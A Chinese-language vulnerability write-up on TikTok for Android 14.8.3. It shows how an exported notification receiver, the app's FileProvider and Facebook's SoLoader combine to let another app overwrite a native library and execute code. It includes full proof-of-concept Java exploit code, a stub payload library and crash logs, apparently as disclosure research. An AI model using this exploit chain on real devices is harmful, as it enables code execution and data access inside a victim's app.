---
layout: post
title:  "[ByteDance] [TikTok] NotificationBroadcastReceiver导出存在任意私有组件启动结合FileProvider机制与FbSoLoader框架导致本地代码执行漏洞"
date:   2020-05-01 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

| 日期 | 版本 | 描述 | 作者 |
| :-: | :-: | :-: | :-: |
| 2022.05.01 | 1.0 | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

## 0x01 触发条件

| 上线时间 | 应用名 | 包名 | 软件版本 | 下载链接 |
| :-: | :-: | :-: | :-: | :-: |
| 2020.02.08 | TikTok | com.zhiliaoapp.musically | 14.8.3 | https://www.apkmirror.com/apk/tiktok-pte-ltd/tik-tok-including-musical-ly/tik-tok-including-musical-ly-14-8-3-release/ |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause

组件`com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver`导出

```xml
<receiver android:name="com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver">
    <intent-filter>
        <action android:name="notification_cancelled"/>
    </intent-filter>
</receiver>
```

当Action为`notification_clicked`的时候，会获取`contentIntentURI`传入`startActivity()`进行跳转，由于`contentIntentURI`外部可控，所以可以跳转调用任意私有不导出Activity组件

```java
public class NotificationBroadcastReceiver extends BroadcastReceiver {
    @Override  // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        if(context != null && intent != null) {
            String action = intent.getAction();
            int intent_type = intent.getIntExtra("type", -1);
            if(intent_type != -1) {
                ((NotificationManager)context.getSystemService("notification")).cancel(intent_type);
            }

            Intent intent_contentIntentURI = (Intent)intent.getParcelableExtra("contentIntentURI");
            if(("notification_clicked".equals(action)) && intent_contentIntentURI != null) {
                try {
                    intent_contentIntentURI.getDataString();
                    context.startActivity(intent_contentIntentURI);    // [1]
                }
                catch(Exception unused_ex) {
                }
            }

            if("notification_cancelled".equals(action)) {
                Map map = null;
                if(intent_contentIntentURI != null) {
                    map = (Map)intent_contentIntentURI.getSerializableExtra("log_data_extra_to_adsapp");
                }

                h.a("push_clear", map);
            }

            return;
        }
    }
}
```

## 0x05 漏洞调试与利用

高版本的安卓系统需要如下使用FileProvider，这里可以看到被设置为不导出

```xml
<provider 
    android:authorities="com.zhiliaoapp.musically.fileprovider" 
    android:exported="false" 
    android:grantUriPermissions="true" 
    android:name="android.support.v4.content.FileProvider">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/c"/>
</provider>
```

对应的配置文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<paths xmlns:android="http://schemas.android.com/apk/res/android">
    <root-path name="name" path=""/>
    <external-path name="share_path0" path="share/"/>
    <external-path name="download_path2" path="Download/"/>
    <cache-path name="gif" path="gif/"/>
    <external-files-path name="share_path1" path="share/"/>
    <external-files-path name="install_path" path="update/"/>
    <external-files-path name="livewallpaper" path="livewallpaper/"/>
    <external-cache-path name="share_image_path0" path="picture/"/>
    <external-cache-path name="share_image_path2" path="head/"/>
    <external-cache-path name="share_image_path3" path="feedback/"/>
    <external-cache-path name="share_image_path4" path="tmpimages/"/>
    <cache-path name="share_image_path1" path="picture/"/>
    <cache-path name="share_image_path3" path="head/"/>
    <cache-path name="share_image_path4" path="tmpimages/"/>
    <cache-path name="share_sdk_path_0" path="share_content_cache/"/>
</paths>
```

先拥有一个任意私有Activity组件打开的能力，去结合FileProvider获取文件读写的能力，再去实现动态库加载

首先是给漏洞组件`com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver`发送广播

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        handleIntent(getIntent());
    }

    private void handleIntent(Intent i) {
        Intent intent = new Intent("notification_clicked");
        intent.setClassName("com.zhiliaoapp.musically", "com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver");
        sendBroadcast(intent);
    }
}
```

回顾下漏洞代码段，会获取`contentIntentURI`字段，用于后续跳转
```java
Intent intent_contentIntentURI = (Intent)intent.getParcelableExtra("contentIntentURI");
if(("notification_clicked".equals(action)) && intent_contentIntentURI != null) {
    try {
        intent_contentIntentURI.getDataString();
        context.startActivity(intent_contentIntentURI);
    }
    catch(Exception unused_ex) {
    }
}
```

如下即可实现指定应用获取FileProvider的文件读写权限，从`NotificationBroadcastReceiver`跳到PoC的`MainActivity`的时候就获得了对FileProvider的文件读写权限，此处指定的文件是`/data/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so`，同时指定了Action为`TIKTOK_ATTACK_NotificationBroadcastReceiver`，会去调用`else`分支，将我们的SO文件写入上面指定的路径

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        handleIntent(getIntent());
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleIntent(intent);
    }

    private void handleIntent(Intent i) {
        if(!"TIKTOK_ATTACK_NotificationBroadcastReceiver".equals(i.getAction())) {
            // NotificationBroadcastReceiver.onReceive()调用startActivity()使用的Intent，用于PoC获取FileProvider的文件读写权限
            Intent next = new Intent("TIKTOK_ATTACK_NotificationBroadcastReceiver");
            next.setClassName(getPackageName(), getClass().getCanonicalName());
            next.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            next.setData(Uri.parse("content://com.zhiliaoapp.musically.fileprovider/name/data/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so"));

            // 发往NotificationBroadcastReceiver的Intent
            Intent intent = new Intent("notification_clicked");
            intent.setClassName("com.zhiliaoapp.musically", "com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver");
            intent.putExtra("contentIntentURI", next);
            sendBroadcast(intent);
        }
        else {
            try {
                OutputStream outputStream = getContentResolver().openOutputStream(i.getData());
                InputStream inputStream = getAssets().open("evil_lib.so");
                IOUtils.copy(inputStream, outputStream);
                inputStream.close();
                outputStream.close();
            }
            catch (Throwable th) {
                throw new RuntimeException(th);
            }
        }
    }
}
```

我们分析下为什么是文件`com.zhiliaoapp.musically/lib-main/libimagepipeline.so`，这得从Facebook开源的SoLoader说起，这个工具可以自动实现SO文件的加载，能够解决大量动态库的依赖问题，它有个特点是会把所有的动态库放到`/data/data/PackageName/lib-main`，然后应用启动的时候会去这个路径下加载动态库，但在测试过程中，这个路径下默认是没有库文件的

那我们既然拥有`/data/data/com.zhiliaoapp.musically`下文件的读写能力，就可以指定其中一个动态库去覆写，应用启动的时候就会加载我们覆写后的动态库，实现代码执行

我们使用如下的代码生成用于攻击的SO，提取其中64位的版本放到PoC的Assets文件夹下

```c
#include <jni.h>
#include <string>
#include <android/log.h>

#define LOG_TAG "######################################################"
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    LOGE("Debug: [%s] \n", __FUNCTION__);
    
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_6;
}
```

**需要注意的是不同版本有不一样的行为，在某些版本并不能生成lib-main文件夹，可以替换成app_librarian/14.8.3.6327148996**

攻击过程：先安装TikTok，点击启动运行，再运行PoC，覆写SO，再重启TikTok就会发现漏洞利用成功，这样也会造成问题，有的库函数没有实现会导致崩溃

```shell
04-29 15:01:09.720 14186 14500 E ######################################################: Debug: [JNI_OnLoad]
04-29 15:01:09.720 14186 14500 E zygote  : No implementation found for long com.facebook.imagepipeline.memory.NativeMemoryChunk.nativeAllocate(int) (tried Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeAllocate and Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeAllocate__I)
04-29 15:01:09.721 14186 14500 E AndroidRuntime: FATAL EXCEPTION: FrescoIoBoundExecutor-2
04-29 15:01:09.721 14186 14500 E AndroidRuntime: Process: com.zhiliaoapp.musically, PID: 14186
04-29 15:01:09.721 14186 14500 E AndroidRuntime: java.lang.UnsatisfiedLinkError: No implementation found for long com.facebook.imagepipeline.memory.NativeMemoryChunk.nativeAllocate(int) (tried Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeAllocate and Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeAllocate__I)
04-29 15:01:10.514 14186 14194 E zygote  : No implementation found for void com.facebook.imagepipeline.memory.NativeMemoryChunk.nativeFree(long) (tried Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeFree and Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeFree__J)
04-29 15:01:10.514 14186 14194 E System  : java.lang.UnsatisfiedLinkError: No implementation found for void com.facebook.imagepipeline.memory.NativeMemoryChunk.nativeFree(long) (tried Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeFree and Java_com_facebook_imagepipeline_memory_NativeMemoryChunk_nativeFree__J)
```

其实也简单，做中间商，手动调用原来的`libimagepipeline.so`库函数，并把结果返回

测试过程中也发现了一些其它问题，可能是版本不匹配，也可能是各种权限的错误

```shell
04-29 02:04:46.667 19563 19889 E AndroidRuntime: FATAL EXCEPTION: FrescoIoBoundExecutor-2
04-29 02:04:46.667 19563 19889 E AndroidRuntime: Process: com.zhiliaoapp.musically, PID: 19563
04-29 02:04:46.667 19563 19889 E AndroidRuntime: java.lang.UnsatisfiedLinkError: couldn't find DSO to load: libimagepipeline.so caused by: ELF file does not contain dynamic linking information
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.soloader.SoLoader.doLoadLibraryBySoName(SourceFile:703)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.soloader.SoLoader.loadLibraryBySoName(SourceFile:564)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.soloader.SoLoader.loadLibrary(SourceFile:500)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.soloader.SoLoader.loadLibrary(SourceFile:455)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imageutils.FrescoSoLoader.loadLibrary(SourceFile:27)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.nativecode.a.load(SourceFile:40)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.NativeMemoryChunk.<clinit>(SourceFile:31)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.y.h(SourceFile:25)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.y.a(SourceFile:13)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.a.get(SourceFile:267)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.x.<init>(SourceFile:51)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.x.<init>(SourceFile:33)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.w.newByteBuffer(SourceFile:48)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.memory.w.newByteBuffer(SourceFile:24)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.producers.aa.a(SourceFile:85)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.producers.aa.b(SourceFile:99)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.producers.ac.a(SourceFile:37)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.producers.aa$1.c(SourceFile:52)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.producers.aa$1.b(SourceFile:48)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.common.executors.f.run(SourceFile:43)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at com.facebook.imagepipeline.core.j$1.run(SourceFile:51)
04-29 02:04:46.667 19563 19889 E AndroidRuntime: 	at java.lang.Thread.run(Thread.java:764)
```

## 0x06 漏洞研究

## 0x07 References

- https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/

## 附录：调试过程记录